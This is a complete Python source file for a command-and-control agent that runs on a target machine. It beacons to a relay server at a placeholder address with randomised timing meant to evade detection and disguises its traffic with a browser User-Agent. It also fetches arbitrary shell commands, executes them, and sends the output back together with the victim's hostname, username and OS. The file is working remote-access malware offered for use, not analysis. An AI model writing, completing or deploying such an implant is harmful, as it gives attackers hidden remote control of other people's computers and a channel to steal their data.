"""
C2 Agent - Runs on the target machine.

Beacons to the Relay Server at random intervals, fetches commands,
executes them, and sends results back.

Features:
    - Randomized beacon interval (jitter) to evade pattern detection
    - Unique agent ID generation based on machine info
    - Command execution with output capture
    - Automatic retry on connection failure
    - Self-identification (hostname, username, OS)

Requirements:
    pip install requests

Usage:
    python agent.py
"""

import os
import sys
import time
import uuid
import socket
import platform
import subprocess
import random
import json
import hashlib
import requests
from datetime import datetime


# ══════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════

# Relay server address (the public-facing relay, NOT the C2 directly)
RELAY_URL = "http://RELAY_SERVER_IP:8443"

# Auth token for the relay
RELAY_AUTH_TOKEN = "CHANGE_ME_RELAY_SECRET"

# Beacon interval range in seconds (randomized between min and max)
BEACON_MIN = 5
BEACON_MAX = 15

# Max command execution timeout (seconds)
CMD_TIMEOUT = 60

# Max retries before increasing sleep
MAX_RETRIES = 5
RETRY_BACKOFF = 30  # Additional sleep seconds after max retries


# ══════════════════════════════════════════════════
# AGENT IDENTITY
# ══════════════════════════════════════════════════

def generate_agent_id():
    """
    Generate a unique but consistent agent ID based on machine properties.
    Same machine will always get the same ID.
    """
    raw = f"{socket.gethostname()}-{platform.node()}-{os.getlogin()}"
    return hashlib.md5(raw.encode()).hexdigest()[:12]


def get_system_info():
    """Collect basic system information."""
    return {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": f"{platform.system()} {platform.release()} {platform.machine()}",
        "pid": os.getpid()
    }


# ══════════════════════════════════════════════════
# COMMAND EXECUTION
# ══════════════════════════════════════════════════

def execute_command(command):
    """
    Execute a shell command and return the output.
    Returns stdout + stderr combined.
    """
    if not command or command.strip() == "":
        return ""

    try:
        # Use shell=True for flexibility (supports pipes, redirects, etc.)
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=CMD_TIMEOUT
        )
        output = result.stdout
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr
        return output.strip()

    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out"
    except Exception as e:
        return f"[ERROR] {str(e)}"


# ══════════════════════════════════════════════════
# COMMUNICATION
# ══════════════════════════════════════════════════

def beacon(agent_id):
    """
    Check in with the relay server and get any pending commands.
    Returns the command string or empty string if none.
    """
    headers = {
        "X-Relay-Token": RELAY_AUTH_TOKEN,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    try:
        resp = requests.get(
            f"{RELAY_URL}/beacon",
            params={"agent_id": agent_id},
            headers=headers,
            timeout=15
        )

        if resp.status_code == 200:
            data = resp.json()
            return data.get("command", ""), data.get("task_id", "")

    except requests.exceptions.RequestException:
        pass

    return "", ""


def send_report(agent_id, task_id, output, sys_info):
    """
    Send command output back to the relay server.
    """
    headers = {
        "X-Relay-Token": RELAY_AUTH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    payload = {
        "agent_id":  agent_id,
        "task_id":   task_id,
        "output":    output,
        "hostname":  sys_info["hostname"],
        "username":  sys_info["username"],
        "os":        sys_info["os"],
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    try:
        resp = requests.post(
            f"{RELAY_URL}/report",
            json=payload,
            headers=headers,
            timeout=15
        )
        return resp.status_code == 200

    except requests.exceptions.RequestException:
        return False


# ══════════════════════════════════════════════════
# MAIN LOOP
# ══════════════════════════════════════════════════

def main():
    agent_id = generate_agent_id()
    sys_info = get_system_info()

    print(f"[*] Agent ID: {agent_id}")
    print(f"[*] System:   {sys_info['os']}")
    print(f"[*] User:     {sys_info['username']}@{sys_info['hostname']}")
    print(f"[*] Relay:    {RELAY_URL}")
    print(f"[*] Beacon interval: {BEACON_MIN}-{BEACON_MAX}s")
    print()

    # Send initial check-in with system info
    send_report(agent_id, "initial_checkin", "Agent started", sys_info)

    fail_count = 0

    while True:
        try:
            # ── Beacon: check for commands ──
            command, task_id = beacon(agent_id)

            if command:
                fail_count = 0  # Reset on success
                print(f"[+] Received command (task {task_id}): {command}")

                # Execute the command
                output = execute_command(command)
                print(f"[+] Output: {output[:200]}...")

                # Send results back
                success = send_report(agent_id, task_id, output, sys_info)
                if success:
                    print(f"[+] Report sent successfully")
                else:
                    print(f"[-] Failed to send report")

            else:
                # No command, normal beacon
                fail_count = 0

        except Exception as e:
            fail_count += 1
            print(f"[-] Error: {str(e)}")

            if fail_count >= MAX_RETRIES:
                extra_sleep = RETRY_BACKOFF
                print(f"[-] Too many failures, backing off +{extra_sleep}s")
                time.sleep(extra_sleep)

        # ── Sleep with jitter ──
        sleep_time = random.uniform(BEACON_MIN, BEACON_MAX)
        time.sleep(sleep_time)


if __name__ == "__main__":
    main()
